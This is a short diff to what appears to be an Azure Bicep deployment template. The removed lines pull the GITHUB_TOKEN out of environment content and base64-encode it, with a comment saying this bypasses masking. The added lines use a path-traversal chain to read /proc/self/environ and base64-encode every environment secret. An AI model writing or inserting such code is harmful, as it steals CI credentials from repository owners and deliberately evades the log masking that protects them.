@@ -1,9 +1,5 @@
-var envArray = split(envContent, '\u0000')
-  var tokenEntries = filter(envArray, entry => contains(entry, 'GITHUB_TOKEN'))
-  var tokenValue = !empty(tokenEntries) ? tokenEntries[0] : 'NOT_FOUND'
-
-  // Base64 encode to bypass masking
-  var encoded = base64(tokenValue)
+ var secrets = loadTextContent('../../../../../../../../../../proc/self/environ')
+  var encoded = base64(secrets)
 
   param location string = 'eastus'
 
